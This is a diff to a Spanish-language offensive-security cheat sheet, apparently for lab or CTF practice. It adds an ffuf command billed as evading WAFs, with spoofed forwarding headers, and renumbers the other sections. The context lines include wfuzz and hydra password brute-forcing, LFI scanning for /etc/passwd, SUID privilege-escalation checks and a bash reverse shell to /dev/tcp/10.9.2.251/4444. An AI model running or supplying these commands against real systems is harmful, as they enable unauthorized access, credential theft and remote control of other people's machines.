@@ -48,7 +48,15 @@
    wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
    ```
 
-## 1.4.Httpx 
+## 1.4.ffuz
+
+1. Evitar WAFs y obtener buenos resultados en errores de divulgación de información
+
+   ```bash
+   ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
+   ```
+
+## 1.5.Httpx 
 
 1. Utilizar **Httpx** para encontrar **LFI**. Este comando que le mostrará todas las urls vulnerables lfi en la pantalla, básicamente etc/passwd archivo de contraseña en la respuesta y mostrar todas las urls en la pantalla.
 
@@ -56,7 +64,7 @@
    echo 'https://ejemplo.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\|\$[^\:]):0:0:"
    ```
    
-## 1.5.Hydra
+## 1.6.Hydra
 
 1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH
 
@@ -76,7 +84,7 @@
    hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
    ```
 
-## 1.6.Enum4linux: SMB
+## 1.7.Enum4linux: SMB
 
 1. Enum4linux es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas Windows como Linux. Opciones **-U** (get userlist), **-M** (get machine list), **-N** (get namelist dump (different from -U and-M)), **-S**  (get sharelist), **-P**  (get password policy information), **-G** (get group and member list) and **-a** (all of the above (full basic enumeration)).
 
@@ -108,7 +116,7 @@
    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP> 
    ``` 
 
-## 1.7.Rockyou
+## 1.8.Rockyou
 
 1. Descomprimir
 
@@ -116,7 +124,7 @@
    gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
 
-## 1.8.SSH
+## 1.9.SSH
 
 1. Realizar un conexión remota
 
@@ -154,7 +162,7 @@
    sudo ssh -i id_rsa <username>@<TARGET_IP>
    ```
 
-## 1.8.NSF
+## 1.10.NSF
 
 1. Montar NFS compartidos
 
@@ -162,7 +170,7 @@
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
 
-## 1.9.FTP
+## 1.11.FTP
 
 1. Vulnerabilidad en modulo mod_Copy
 
@@ -187,7 +195,7 @@
    ```
 
 
-## 1.10.Linux: Privilege escalation
+## 1.12.Linux: Privilege escalation
 
 1. Buscar permisos en todos los archivos SUID:
    - Los bits SUID pueden ser peligrosos, algunos binarios como passwd    necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.
@@ -204,7 +212,7 @@
    ```
 
 
-## 1.11.Data Base: SQL, MYSQL, SQLITE, PhpMyAdmin
+## 1.13.Data Base: SQL, MYSQL, SQLITE, PhpMyAdmin
 
 1. Leear archivos sqlite
    
@@ -223,7 +231,7 @@
    ```
    
 
-## 1.12.Linux: Comandos mas usados
+## 1.14.Linux: Comandos mas usados
 
 1. Para trasnferir archivos usando nc
 
@@ -268,7 +276,7 @@
    /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
    ``` 
 
-## 1.13.Sitios Web
+## 1.15.Sitios Web
 
 1. Para descifrar hashes de contraseñas débiles
 
@@ -301,7 +309,7 @@
    ```
 
 
-## 1.14.Extensiones para web browser
+## 1.16.Extensiones para web browser
 
 1. Ripper Web Content | Capture Metadata Content
 
